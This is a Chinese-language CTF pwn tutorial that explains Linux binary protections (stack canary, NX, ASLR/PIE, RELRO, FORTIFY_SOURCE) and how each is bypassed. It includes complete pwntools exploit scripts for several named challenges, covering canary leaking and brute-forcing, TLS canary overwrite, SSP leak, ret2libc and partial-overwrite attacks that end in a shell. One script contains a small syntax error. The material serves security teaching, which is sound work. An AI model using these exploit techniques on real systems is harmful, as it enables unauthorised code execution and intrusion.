CTF-pwn 技术总结（3）
===============

学习linux pwn，linux安全机制的知识是绕不开的。如果能理解这些安全机制的原理以及不懂得如何绕过它们，那么在比赛时将你举步维艰，本节我就总结了所有linux安全机制的基本原理以及具体的绕过方法，希望能帮助一些小萌新更快入门，帮助需要进阶的朋友打好根基。

linux安全机制详解与绕过
--------------

### 一、Stack canary

**Stack canary**（取名自地下煤矿的金丝雀，因为它能比矿工更早发现煤气泄漏，有预警作用）是一种用于对抗栈溢出攻击的技术，有时也叫做 **Stack cookie** 。canary的值是栈上的一个随机数，在程序启动时随机生成并保存在比函数返回地址更低的位置。由于栈溢出是从低地址向高地址进行覆盖，因此攻击者要想控制函数的返回指针，就一定要先覆盖到Canary。程序只需要在函数返回前检查Canary是否被篡改，就可以达到保护栈的目的。

可以在 GCC 中使用以下参数设置 Canary:

```php
-fstack-protector 为内部缓冲区大于8字节的函数插入保护
-fstack-protector-all 为所有函数插入保护
-fstack-protector-strong 增加对包含局部数组定义和地址引用的函数的保护
-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护
-fno-stack-protector 禁用保护
```

#### 示例：

```c
#include <stdio.h>
void main()
{
    char buf[10];
    scanf("%s", buf);
}
```

关闭canary：

![image-20220201102419146](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-0c843d56f7cb846044805175a595e7469cbc94b2.png)

开启canary：

![image-20220201102707231](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-b49dfc8963c26f56d68126a23a6ed51c3fbf7564.png)

可以发现开启canary后，程序终止并抛出错误 “stack smahing detected”，表示检测到了栈溢出

其反汇编代码如下：

```assembly
pwndbg> disassemble main
Dump of assembler code for function main:
   0x00000000004005b6 <+0>:     push   rbp
   0x00000000004005b7 <+1>:     mov    rbp,rsp
   0x00000000004005ba <+4>:     sub    rsp,0x20
   0x00000000004005be <+8>:     mov    rax,QWORD PTR fs:0x28  ----取出随机生成的canary
   0x00000000004005c7 <+17>:    mov    QWORD PTR [rbp-0x8],rax ---将canary安放在栈上
   0x00000000004005cb <+21>:    xor    eax,eax
   0x00000000004005cd <+23>:    lea    rax,[rbp-0x20]
   0x00000000004005d1 <+27>:    mov    rsi,rax
   0x00000000004005d4 <+30>:    mov    edi,0x400684
   0x00000000004005d9 <+35>:    mov    eax,0x0
   0x00000000004005de <+40>:    call   0x4004a0 <__isoc99_scanf@plt>
   0x00000000004005e3 <+45>:    nop
   0x00000000004005e4 <+46>:    mov    rax,QWORD PTR [rbp-0x8] ---取出栈上的值
   0x00000000004005e8 <+50>:    xor    rax,QWORD PTR fs:0x28   ---与生成的canary进行比较
   0x00000000004005f1 <+59>:    je     0x4005f8 <main+66>   ---相等程序继续执行
   0x00000000004005f3 <+61>:    call   0x400480 <__stack_chk_fail@plt> ---不相等进入处理函数
   0x00000000004005f8 <+66>:    leave  
   0x00000000004005f9 <+67>:    ret    
End of assembler dump.
```

注意标有注释的部分。对于64位程序，在开始运行时，就会随机生成canary，存放在 **TLS结构体 tcbhead\_t** 偏移为 **0x28** 的位置，带有缓冲区的函数在函数开头就会利于 **FS指针** 从该位置取出canary的值将其置于 **rbp-0x8** 的位置，在函数返回时，就会比较 **FS\[0x28\]** 里原本的canary和栈上的canary，若相等，程序继续向下执行；若不相等，进入处理栈溢出的函数—— **stack\_chk\_fail**,它会让程序终止并且抛出报错 “stack smahing detected”。

对于32位程序，canary变成了 **gs寄存器偏移0x14** 的地方。

#### 检测

我们可以通过checksec检测程序是否开启canary：

![image-20220201105114184](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-adc63054e40c78c77d8e26607c3bb10645b3c7d6.png)

### 绕过方法

canary保护机制是所有linux保护机制中绕过方法最多的一种保护机制，下面给出常用的几种绕过方法：

**1、泄露canary**

**2、劫持\_stack\_chk\_fail函数**

**3、爆破canary**

**4、覆盖TLS中储存的canary值**

**5、SSP leak 攻击**

- - - - - -

### 1.泄露canary

利用现有漏洞泄露出canary的值，然后再构造ROP链

#### 例题：

**来自攻防世界—Mary\_Morton**

64位的程序，并且开启了NX和Canary：

![image-20220201112017967](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-3fc56df53ca3177f44d1f555408abd1bf1bfc99b.png)

执行一下文件看看流程，存在两个漏洞：

![1232423kasfd](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-597ed4b0078929c20654a35b423b3cbb1f396aa1.png)

ida查看伪代码：

![image-20220201111832367](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-fb37d981fcd2019e7dcf05a3c7fd5409b57801d7.png)

存在格式化字符串漏洞：

![image-20220201112249535](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-b7542be8113b2ada4c7d725a9b1b2d209cc05439.png)

存在栈溢出漏洞：

![image-20220201112333285](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-f78d10802d588a1ada695c2ed591c25842899fef.png)

还存在一个后门函数：

![image-20220201112534968](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-ece1c6b4f232a232df610a6e339e40dd9bc32055.png)

##### 思路：

先利用上一节所讲的格式化字符串泄露出canary的值，再利用栈溢出漏洞带上canary覆盖返回地址为后门函数。

##### EXP：

```python
from pwn import *
p=remote('111.200.241.244',59339)

p.recvuntil('3. Exit the battle')
p.sendline('2')

p.sendline('%23$p')

p.recvuntil('0x')
canary=int(p.recv(16),16)
success('canary: ' + hex(canary))

backdoor=0x4008da
payload='a'*0x88 + p64(canary) +'a' * 8 + p64(backdoor)
p.recvuntil('3. Exit the battle')
p.sendline('1')
p.sendline(payload)

p.interactive()
```

### 2.劫持\_stack\_chk\_fail函数

已知 canary 失败的处理逻辑会进入到 `__stack_chk_fail` 函数，`__stack_chk_fail` 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。

#### 例题：

**ZCTF2017 —Login**

演示参考：<https://futurehacker.tech/archives/pwn-zctf2017-login>

### 3.爆破canary

对于 canary，虽然每次进程重启后的 Canary 不同，但是同一个进程中的不同线程的 canary 是相同的， 并且通过 fork 函数创建的子进程的 canary 也是相同的，因为 fork 函数会直接拷贝父进程的内存。我们可以利用这样的特点，彻底逐个字节将 canary 爆破出来。

#### 例题：

**2017湖湘杯—pwn100**

![image-20220201114714626](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-a80ac78c68c53976663d2953df0848eb3bfdff1d.png)

main函数：

![image-20220201115234778](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-9d97762b70288043216ba65020ef8f5d553a264b.png)

跟进sub\_8048B29()，

![image-20220201115725938](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-2069c2ecf641f3e1a7eba604328b8f95237e1552.png)

继续跟进，

![image-20220201115406337](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-faaa5074dd85e1001a2631767c650c001bc68e23.png)

分析可以知道这里就是base64解密算法：

![image-20220201115553138](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-7b70cf33b3eb32be9ab88d5d417c4ea26c4f7f9a.png)

找到输入点，可以看到最大可以输入0x200（512）字节的数据，对于输入格式的要求是能够进行base64解码：

![image-20220201115815546](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-3541973858a5b24c6839e16a3ef04bd1dc4dd6f2.png)

##### 思路：

base64解码的结果存入char数组v21\[257\],base64解码之后的数据大小大概是原来的3/4，足够造成栈溢出了。本题难点在于canary，由于程序通过 `fork()` 创建子进程，所以想到了爆破canary，这是个32位的程序，所以canary有4个字节，最低位一定是\\x00，所以只需要爆破三个字节即可。

**爆破代码：**

```php
canary = '\x00'
p.recvuntil('May be I can know if you give me some data[Y/N]\n')
for i in xrange(3):
    for j in xrange(256):
        p.send('Y\n')
        p.send(b64encode('a'*257+ canary + chr(j)))
        recv =p.recvuntil('May be I can know if you give me some data[Y/N]\n')
        if 'Finish' in recv:
            canary += chr(j)
            break
print 'find canary:'+canary.encode('hex')
```

得到canary后，再次返回输入处，构造ROP泄露libc基址，最后再回到一次输入处，构造ROP来getshell。

##### EXP：

```python
from pwn import *
from base64 import *
context.log_level = 'debug'
p = process('./pwns')
elf = ELF('pwns')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
vulc_addr = 0x080487E6

# brute
canary = '\x00'
p.recvuntil('May be I can know if you give me some data[Y/N]\n')
for i in range(3):
    for j in range(256):
        p.send('Y\n')
        p.send(b64encode('a'*257+ canary + chr(j)))
        recv =p.recvuntil('May be I can know if you give me some data[Y/N]\n')
        if 'Finish' in recv:
            canary += chr(j)
            break
success('find canary:' + canary.encode('hex'))
payload = 'a'*257 + canary +'a'*12 + p32(puts_plt) + p32(vulc_addr) + p32(puts_got)
p.send('Y\n')
p.recvuntil('Give me some datas:\n\n')
p.send(b64encode(payload))
puts = u32(p.recv()[268:268+4])
success("puts: " + hex(puts))

# libc = ELF('libc.so.6')
libc=ELF('/lib/i386-linux-gnu/libc.so.6')
libc_base = puts - libc.symbols['puts']
sys = libc_base + libc.symbols['system']
binsh = libc_base + libc.search('/bin/sh').next()
success('libc_base: ' + hex(libc_base))

p.send('Y\n')
p.recvuntil('Give me some datas:\n\n')
payload = 'a'*257+canary+ 'a'*12 + p32(sys) + p32(vulc_addr) + p32(binsh)
p.send(b64encode(payload))

p.interactive()
```

### 4.覆盖TLS中储存的canary值

canary是存储在TLS中的，函数返回前会使用这个值进行对比，当栈溢出空间较大时，我们同时覆盖栈上存储的canary和TLS储存的canary实现绕过

**知识点：在gdb里使用 `fsbase` 命令可以找到TLS结构体的地址**

![image-20220201135120817](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-fe955f889c4abd5a9e8727c4c022ba47ce6232b7.png)

#### 例题：

**某高校校赛题**

本题是一个64位程序，题目给了libc版本2.31

![image-20220201134454132](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-8b9936b40e7d3ee6a5ff550f48acd97d5355bf5e.png)

main函数创建了一个子进程——test\_thread:

![image-20220201134651767](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-84567448499b8be15312fa170f204f96c4cb00de.png)

大量栈溢出，但是存在canary：

![image-20220201134725299](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-c35ff883464ecf22c923ffe9f596082134a9b185.png)

##### 思路：

用docker起个libc-2.31的环境，gdb调试查看cannary的值，然后 **用fsbase查找TLS结构体的位置（即FS指针位置）** ，可以取得cannary的保存位置即 **FS:\[28\]** ——**$rbp+2104**，又因为栈溢出字节数很多，可以覆盖到这个位置，然后就可以构造ROP同时覆盖栈上存储的canary和TLS储存的canary实现绕过进行libc的泄露，最后再次回到输入处，再次构造ROP调用execve来getshell，本题system可能由于高版本的问题打不通。

##### EXP:

```python
from pwn import *
context.log_level = 'debug'

p = process('./a.out')
#p = gdb.debug("./a.out")
e = ELF('./a.out')

def sl(content):
 p.sendline(content)
def r_a64(signal):
 return u64(p.recvuntil(signal)[-6:].ljust(8,'\x00'))

puts_got = e.got['puts']
puts_plt = e.plt['puts']
pop_rdi = 0x401363
main = 0x4011D6

payload1 = 0x30 * 'a' +  + 0x8 * 'b' 
payload2 = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
payload = payload1 + payload2.ljust(2104,'a')
sl(payload)
puts = r_a64('\x7f')
success('puts: ' + hex(puts))

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc = ELF('./libc-2.31.so')
libc_base = puts - libc.symbols['puts']
exe = libc_base + libc.symbols['execve']
binsh = libc_base + libc.search('/bin/sh').next()
success('libc_base: ' + hex(libc_base))

rdx_r12 = 0x11c371 + libc_base
rsi = 0x27529 + libc_base
payload = 0x30 * 'a' + 0x8 * 'b' + p64(pop_rdi) + p64(binsh) + p64(rsi) + p64(0) + p64(rdx_r12) + p64(0) * 2 + p64(exe) + p64(main)
sl(payload)

p.interactive()
```

### 5.SSP leak 攻击

除了通过各种方法泄露canary之外，我们还有一个可选项——利用`__stack_chk_fail`函数泄露信息。这种方法作用不大，没办法让我们getshell。但是当我们需要泄露的flag或者其他东西存在于内存中时，我们可能可以使用一个栈溢出漏洞来把它们泄露出来。这个方法叫做 **SSP(Stack Smashing Protect) Leak**。

简单的来说，SSP leak 就是通过故意触发canary的保护来输出我们想要地址上的值。

我们先来回顾一下canary起作用到程序退出的流程。首先，canary被检测到修改，函数不会经过正常的流程结束栈帧并继续执行接下来的代码，而是跳转到`call __stack_chk_fail`处，然后对于我们来说，执行完这个函数，程序退出，屏幕上留下一行  
**\*\*\* stack smashing detected \*\*\*: \[XXX\] terminated** 。如：

![image-20220201102707231](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-b49dfc8963c26f56d68126a23a6ed51c3fbf7564.png)

这里的 **\[XXX\]** 是程序的名字。显然，这行字不可能凭空产生，肯定是`__stack_chk_fail`打印出来的。而且，程序的名字一定是个来自外部的变量（毕竟ELF格式里面可没有保存程序名）。既然是个来自外部的变量，就有修改的余地。我们看一下`__stack_chk_fail`的源码，会发现其实现如下：

```c
void __attribute__ ((noreturn)) __stack_chk_fail (void) 
{  
    __fortify_fail ("stack smashing detected"); 
} 
void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg) 
{  
    /* The loop is added only to keep gcc happy. */ 
    while (1)   
        __libc_message (2, "*** %s ***: %s terminated\n",             
                        msg, __libc_argv[0] ?: "<unknown>"); 
}
```

我们看到`__libc_message`一行输出了 **\*\*\* %s \*\*\*: %s terminated\\n** 。这里的参数分别是msg和`__libc_argv[0]`。`char *argv[]`是main函数的参数，`argv[0]`存储的就是程序名，且这个argv\[0\]就存在于栈上。

因此 **SSP leak就是通过修改栈上的 argv\[0\]指针** ，从而让 `__stack_chk_fail` 被触发后输出我们想要知道的东西。

#### 例题：

**来自 Jarvis OJ—Smashes**

64位程序不仅开了NX、canary,还开了FORTIFY

![image-20220201141323970](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-f9a05b45ad490e8fdf821d4d8e4295c388d69d11.png)

![image-20220201141211457](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-6ff1972ffec2668d4a51d9ebfcb9bd4ac421c9b1.png)

**IO\_gets()** 函数处明显存在栈溢出：

![image-20220201141141698](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-3e7b28bd0822829dd2cdcf58127be3516cbc2e2c.png)

##### 思路：

利用栈溢出覆盖 **argv\[0\]指针**，让其指向内存中flag字符串的位置，然后故意触发canary保护机制，达到在打印报错信息的同时打印出flag字符串的目的。

在main函数下个断点，查看 **argv\[0\]指针的地址** —— **0x7fffffffe498**

![image-20220201184756552](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-c7ce3712c18127100356f99dc0df61abce108b51.png)

在 **0x400813** 下个断点，查看输入的 **name在栈上的地址**

![image-20220201185009388](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-140deb1739b155779ac341c2db87f3989fcdd5bc.png)

得到 **name地址** ：**0x7fffffffe280**

![image-20220201185138980](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-335365bddc8f12d044aa9659de6fccda7137bd7d.png)

计算偏移为 **0x7fffffffe498 - 0x7fffffffe280 = 0x218**

再通过搜索，找到flag字符串在内存中的位置：

![image-20220201183833145](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-9c37d8983f01dfdc7a7310856547c70573eee574.png)

尝试发现 **0x400d20** 才是flag的真实位置。

##### EXP：

```python
from pwn import *
context.log_level = 'debug'

p = remote("pwn.jarvisoj.com",9877)
p.recvuntil("Hello!\nWhat's your name? ")
offset = 0x218
p.sendline('a' * offset + p64(0x400d20))
p.recvuntil("Please overwrite the flag: ")
p.sendline()
p.interactive()
```

### 二、No-eXecute

No-eXecute即NX保护 (不可执行）的意思，NX（window上称为DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。

gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。

开启NX保护，GNU\_STACK权限为RWE(可读、可写、可执行)：

![image-20220202100935288](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-25218da9eaf8c4047388de2a0bf7b441eb417a6e.png)

关闭NX保护，GNU\_STACK权限只有RW（不可执行）：

![image-20220202100858350](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-718dd99f5cb520e732a21dcf4017e37e068ddf13.png)

### 绕过方法

**1、ret2libc攻击**

**2、修改分配页面的保护级别**

- - - - - -

### 1.ret2libc攻击

**ret2libc** 全称为 **return to libc** ，即返回到libc库。由于栈和堆均不可执行，使我们无法直接向栈或堆注入shellcode，然后跳转到起始位置开始执行。由此 **ret2libc** 攻击方式应运而生。 **ret2libc** 是利用程序现有的代码片段构造 **ROP链** 使程序返回到libc库中去执行libc中的函数，比如 **system('/bin/sh')** 。因为一般程序默认开启NX保护，所以 **ret2libc** 是pwn中最常用最有效的方法之一。

*&lt;u&gt;因为该方法过于基础常见，就不做例题演示了。&lt;/u&gt;*

### 2.修改分配页面的保护级别

开了NX保护的情况下就只有程序的 .text 段被标记为可执行，而其余的数据段（.data、.bss等）以及栈、堆均为不可执行。libc函数库中有两个函数可以修改分配页面的属性即可以让一部分不可执行的空间修改为可执行，这两个函数分别是 **mprotect** 和 **mmap** 。这里我就只介绍 **mprotect** 函数：

#### mprotect使用：

函数原型：

```c
#include <unistd.h>
#include <sys/mmap.h>
int mprotect(const void *start, size_t len, int prot);
```

mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。

prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：

- PROT\_READ （1）：表示内存段内的内容可读；
- PROT\_WRITE（2）：表示内存段内的内容可写；
- PROT\_EXEC （4）：表示内存段中的内容可执行；
- PROT\_NONE（0）：表示内存段中的内容根本没法访问。

需要指出的是，&lt;u&gt;锁指定的内存区间必须包含整个内存页&lt;/u&gt;（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。

一般情况下，我们都是使用 **mprotect(bss\_addr , 0x1000, 7)** ,这样可以让从 **bss\_addr**（选择bss段的原因是bss段的空闲空间很大，而且地址好找）开始的 **0x1000** 大小 的区域权限为 **RWE**(R + W + E = 1 + 2 + 4 =7)即可读可写可执行，这样之后我们可以直接注入shellcode到这一区域中，然后再让程序跳转到这里执行shellcode。

当然我们还可以利用 **mprotect** 将.**got.plt** 修改为可读可写可执行，这样我们就能更改got表项地址，劫持got表函数。

##### 例题：

*看我之前发布的 **CTF-pwn 技术总结（1）**中的 **CET4***

### 三、ASLR和PIE

#### ASLR

大多数攻击都基于这样一个前提，即攻击者知道程序的内部布局。因此，引入内存布局的随机化能有效增加漏洞利用的难度，其中一种技术就是地址空间布局随机化（Address Space Layout Randomization,ASLR）。ASLR提供的只是概率上的安全性，根据用于随机化的熵，攻击者有可能幸运地猜测到正确的地址，有时攻击者还可以爆破。

在linux上，**ASLR** 的全局配置 **/proc/sys/kernel/randomize\_va\_space** 有以下三种情况

0 - 表示关闭进程地址空间随机化  
1 - 表示将mmap的基址，stack和vdso页面随机化  
2 - 表示在1的基础上增加栈（heap）的随机化

| ASLR | Executable | PLT | Heap | Stack | shared libraries |
|---|---|---|---|---|---|
| 0 | x | x | x | x | x |
| 1 | x | x | x | O | O |
| 2 | x | x | O | O | O |
| 2+ **PIE** | O | O | O | O | O |

查看 ASLR

```php
cat /proc/sys/kernel/randomize_va_space 
```

更改ASLR，切换至root用户，输入命令

```php
echo 0 > /proc/sys/kernel/randomize_va_space
```

#### PIE

**PIE** 全称为位置无关可执行文件（Position-Independent Executable）,它在应用层的编译器上实现，通过将程序编译为位置无关代码（Position-Independent Code, PIC）,使程序可以加载到任意位置，就像一个特殊的共享库。在 **PIE和ASLR同时开启** 的情况下，攻击者将对程序内部布局一无所知，大大增加了利用难度。

GCC支持的 **PIE** 选项：

```php
-fpic       为共享库生成位置无关代码
-pie        生成动态链接的位置无关的可执行文件，通常需要同时指定 -fpie
-no-pie     不生成动态链接的位置无关的可执行文件
-fpie       类似于-fpic，但生成的位置无关代码只能用于可执行文件，通常同时指定-pie
-fno-pie    不生成位置无关代码
```

通常对于一般的可执行文件，使用 **"-pie-fpie"** 参数。

#### 绕过方法

**1、泄露地址**

**2、partial write**

- - - - - -

### 1.泄露地址

PIE 保护机制，影响的是程序加载的基址，并不会影响指令间的相对地址，因此如果我们能够泄露程序的某个地址，就可以通过修改偏移获得程序其它函数的地址。

#### 例题：

*看我之前发布的 **CTF-pwn 技术总结（1）**中的 **checkin\_revenge***

### 2.partial write

**partial write** (部分写入)就是一种利用了PIE技术缺陷的绕过技术。由于内存的页载入机制，PIE的随机化只能影响到单个内存页。通常来说，一个内存页大小为0x1000，这就意味着不管地址怎么变，某条指令的后12位，3个十六进制数的地址是始终不变的。因此通过覆盖EIP的后8或16位 (按字节写入，每字节8位)就可以快速爆破或者直接劫持EIP。

#### 例题：

**来自 DefCamp CTF Finals 2016—SMS**

64位开启PIE与NX程序，

![image-20220202162807044](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-5c1dd91193c785128c8ca3b4a2933d5d63b4e806.png)

main函数：

![image-20220202162429085](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-20d75874ec12524f8e212f6d341986046e00884c.png)

进入dosms函数：

![image-20220202162614924](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-535fcc50bf7af97e56b0d3931bcc8ebc21eb1fb7.png)

set\_user函数：

![image-20220202162551865](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-0865b160c00d7003e28144b7796be3e8d9dbceb2.png)

set\_sms函数：

![image-20220202162644075](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-8db3a1738ed68835567c1e1f0aad3c0b68970847.png)

程序存在后门函数——frontdoor，进入看看:

![image-20220202163243404](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-988136dd303cf9c911b08004de8559fa887b283f.png)

##### 思路：

重要的地方在于，fgets向s处读入数据，然后通过strncpy函数，将读入的s的 （a1+180） 长度，复制到a1。a1+180处 要被当做数值来执行strncpy，只要a1+180处数值足够大就可以造成栈溢出。由set\_user函数可以知道，a1+180处的数据刚刚好是可以改写的。所以我们只要利用栈溢出改写程序的返回地址为后门函数的地址即可。但因为本题开启了PIE，我们无法知道后门函数的准确地址，我们只知道它后3位为 **0x900**：

![image-20220202164546065](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-dadcb7eb7dc30807cb965b67d6ab7eae50eb401a.png)

所以我们利用 **partial write** 方法来部分覆盖返回地址，但是由于payload必须按字节写入，每个字节是两个十六进制数，所以我们必须输入两个字节。除去已知的0x900还需要爆破一个十六进制数。这个数只可能在0~0xf之间改变，因此爆破空间不大，可以接受。

##### EXP：

```python
#coding:utf-8
from pwn import *
context.log_level = 'debug'

i = 0
while True:
    i += 1
    success("this is the %d times" % i)
    p = process('./SMS')
    payload1 = 'a'*40 + '\xca'
    p.sendlineafter('Enter your name\n', payload1)
    payload2 = 'b'*200 + '\x01\x09'  # 这里假设实际地址低16位为0x0901，爆破直到地址正确
    p.sendlineafter('SMS our leader\n', payload2)
    p.recv()
    try:
        p.recv(timeout = 1)
    except EOFError:
        p.close()   # 如果触发异常，即地址第16位不为0x0901，那么关闭程序，继续下一趟的尝试
        continue
    else:   # 没有触发异常，说明程序成功调用frontdoor，那么输入参数获取shell
        p.sendline('/bin/sh\x00')
        p.interactive()
        break
```

### 四、RELRO

**RELRO**（ReLocation Read-Only）是设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击的一种程序保护机制。

在Linux中有两种RELRO模式：`Partial RELRO` 和 `Full RELRO`。Linux中`Partical RELRO`默认开启。

#### Partial RELRO：

**编译命令：**

```javascript
gcc -o test test.c // 默认部分开启
gcc -Wl,-z,relro -o test test.c // 开启部分RELRO
gcc -z lazy -o test test.c //部分开启
```

- 该ELF文件的各个部分被重新排序。内数据段（internal data sections）（如.got，.dtors等）置于程序数据段（program’s data sections）（如.data和.bss）之前；
- 无 plt 指向的GOT是只读的；
- GOT表可写（应该是与上面有所区别的）。

#### Full RELRO：

**编译命令：**

```javascript
gcc -Wl,-z,relro,-z,now -o test test.c // 开启Full RELRO
gcc -z now -o test test.c // 全部开启
```

- 支持Partial模式的所有功能；
- 整个GOT表映射为只读的。

**简单来说 用checksec查看 RELRO为” `Partial RELRO` ”，说明我们对GOT表具有写权限；如果为 ” `FULL RELRO` “ ，意味着我们无法修改got表。**

#### 绕过方法

一般遇到 **FULL RELRO** 不必硬刚，一般还是有其他漏洞点可利用，不是必须要利用GOT表的。但是也是有方法绕过的：

**1.修改分配页面的保护级别**

利用libc函数 **mprotect** 修改got表属性为 **RWE**。

*具体实现方法同上面 **NX保护** 绕过方法 中的 **修改分配页面的保护级别**，仅将修改地址改为 got表地址即可。*

### 五、FORTIFY\_SOURCE

**Fority** 其实非常轻微的检查，用于检查是否存在缓冲区溢出的错误。 **Fortify** 是GCC在编译源码时判断程序的哪些buffer会存在可能的溢出，在buffer大小已知的情况下，GCC会把 `strcpy`、`memcpy`、`memset`等函数自动替换成相应的`__strcpy_chk`(`dst`, `src`, `dstlen`)等函数，达到防止缓冲区溢出的作用。\*\*\*\*

FORTIFY\_SOURCE 机制 **对格式化字符串有两个限制**：

(1)包含%n的格式化字符串不能位于程序内存中的可写地址；

(2)当使用位置参数时，必须使用范围内的所有参数。例如要使用%4$x，则必须同时使用1、2、3。

#### 开启/关闭方式

GCC中`-D_FORTIFY_SOURCE=2`是默认开启的，但是只有开启O2或以上优化的时候，这个选项才会被真正激活。

如果指定`-D_FORTIFY_SOURCE=1`，那同样也要开启O1或以上优化，这个选项才会被真正激活。

可以使用`-U_FORTIFY_SOURCE`或者`-D_FORTIFY_SOURCE=0`来禁用。

如果开启了`-D_FORTIFY_SOURCE=2`，那么调用`__printf_chk`函数的时候会检查format string中是否存在`%n`，如果存在`%n` 而且format string是在一个可写的segment中的（不是在read-only内存段中），那么程序会报错并终止。如果是开启`-D_FORTIFY_SOURCE=1`，那么就不会报错

`gcc -D_FORTIFY_SOURCE=1` 仅仅只会在编译时进行检查 (特别像某些头文件 `#include <string.h>`)

`gcc -D_FORTIFY_SOURCE=2` 程序执行时也会有检查 (如果检查到缓冲区溢出，就终止程序)

```php
gcc -o test test.c                          // 默认情况下，不会开这个检查
gcc -D_FORTIFY_SOURCE=1 -o test test.c      // 较弱的检查
gcc -D_FORTIFY_SOURCE=2 -o test test.c      // 较强的检查
```

#### 绕过方法

FORTIFY保护一般在CTF比赛中很少遇见，就算是开启了该保护，一般也有其他漏洞点可以利用，一般不会在它上面做文章，但是FORTIFY\_SOURCE中的格式字符串保护机制存在有绕过方法，感兴趣的小伙伴可以从一篇国外的经典文章：<http://phrack.org/issues/67/9.html> 学习一下 ，这里就不再说明。